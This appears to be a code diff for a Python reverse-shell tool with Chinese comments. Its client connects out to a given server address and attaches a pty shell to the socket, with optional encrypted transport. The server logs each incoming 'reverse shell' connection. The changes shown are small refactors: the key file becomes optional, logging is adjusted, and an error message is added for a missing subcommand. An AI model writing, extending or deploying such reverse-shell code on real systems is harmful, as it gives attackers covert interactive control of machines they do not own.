@@ -26,9 +26,12 @@ import argparse
 import traceback
 import threading
 import selectors
+# import multiprocessing as mp
+
 from pathlib import Path
 from subprocess import Popen
 from logging.handlers import TimedRotatingFileHandler
+
 
 from libcnet import (
     Transfer,
@@ -41,7 +44,7 @@ STDOUT = sys.stdout.fileno()
 
 
 def getlogger(level=logging.INFO):
-    fmt = logging.Formatter("%(asctime)s %(levelname)s %(filename)s:%(funcName)s:%(lineno)d %(message)s", datefmt="%Y-%m-%d-%H:%M:%S")
+    fmt = logging.Formatter("%(asctime)s %(filename)s:%(funcName)s:%(lineno)d %(levelname)s %(message)s", datefmt="%Y-%m-%d-%H:%M:%S")
 
     # stream = logging.StreamHandler(sys.stdout)
     # stream.setFormatter(fmt)
@@ -81,6 +84,7 @@ def signal_SIGWINCH_handle(sock, sigNum, frame):
     # logger.debug("sigwinch 向对端发送新窗口大小")
     # set_pty_size(STDOUT, *size)
     sock.write(PacketType.TTY_RESIZE, struct.pack("!HH", *size))
+
 
 # 管理子进程退出的
 class Watch(threading.Thread):
@@ -176,6 +180,7 @@ class RecvSend:
     def close(self):
         self.sock.close()
 
+
 class CRecvSend:
 
     def __init__(self, sock):
@@ -214,7 +219,6 @@ class CRecvSend:
 
 def socketshell(sock):
     try:
-        env = os.environ.copy()
         pty_master, pty_slave = pty.openpty()
 
         ss = selectors.DefaultSelector()
@@ -286,8 +290,11 @@ def socketshell(sock):
 def server(args):
     server_addr = (args.addr, args.port)
 
-    Spriv = args.keyfile["Spriv"]
-    Spub = tuple(args.keyfile["Spub"]) if args.keyfile.get("Spub") else None
+    if args.keyfile:
+        Spriv = args.keyfile["Spriv"]
+        Spub = tuple(args.keyfile["Spub"]) if args.keyfile.get("Spub") else None
+    else:
+        Spriv = None
 
     logger.info(f"{sys.argv[0]} listen: {server_addr}")
 
@@ -301,7 +308,9 @@ def server(args):
 
         client_sock, addr = sock.accept()
         # client_sock.setblocking(False)
-        logger.info(f"有反向shell连接上: {addr}")
+        msg = f"有反向shell连接上: {addr}"
+        print(msg)
+        logger.info(msg)
 
         if Spriv:
             c = Transfer(client_sock)
@@ -385,8 +394,12 @@ def server(args):
 def client(args):
     addr = args.addr
     port = args.port
-    Spriv = args.keyfile["Spriv"]
-    Spub = args.keyfile["Spub"][0] if args.keyfile["Spub"] else None
+
+    if args.keyfile:
+        Spriv = args.keyfile["Spriv"]
+        Spub = args.keyfile["Spub"][0] if args.keyfile["Spub"] else None
+    else:
+        Spriv = None
 
     if addr == "":
         logger.info("client 需要 server 地址")
@@ -427,9 +440,10 @@ def client(args):
             sock = RecvSend(sock)
 
         th = threading.Thread(target=socketshell, args=(sock,), daemon=True)
+        # th = mp.Process(target=socketshell, args=(sock,))
         th.start()
         th.join()
-        logger.info(f"连接 server: {server_addr}, socketshell 线程退出")
+        logger.info(f"连接 server: {server_addr}, socketshell 退出")
         time.sleep(10)
 
 
@@ -438,7 +452,7 @@ def keypair(filename: str):
     if filename.exists():
         with open(filename) as f:
             j = json.load(f)
-            print(j)
+            logger.debug(f"{j}")
             return j
     else:
         argparse.ArgumentError(f"{filename} 必须是公私钥配置文件")
@@ -473,7 +487,7 @@ def main():
     # parse.add_argument("--Spub", action="store", nargs="+", help="使用加密通信的对方公钥，server端可能有多个。")
     # parse.add_argument("--Spriv", action="store", help="使用加密通信的私钥。")
 
-    parse.add_argument("--keyfile", action="store", type=keypair, help="加密通信的公私钥。")
+    parse.add_argument("--keyfile", action="store", type=keypair, help="使用加密通信和指定公私钥。")
 
     subparsers = parse.add_subparsers(title="指令", metavar="")
     server_func =  subparsers.add_parser("server", help="启动服务端")
@@ -497,6 +511,8 @@ def main():
         return args.func(args)
     except KeyboardInterrupt:
         pass
+    except AttributeError:
+        print("必须给一个指令： <client|server> ")
 
 
 if __name__ == "__main__":
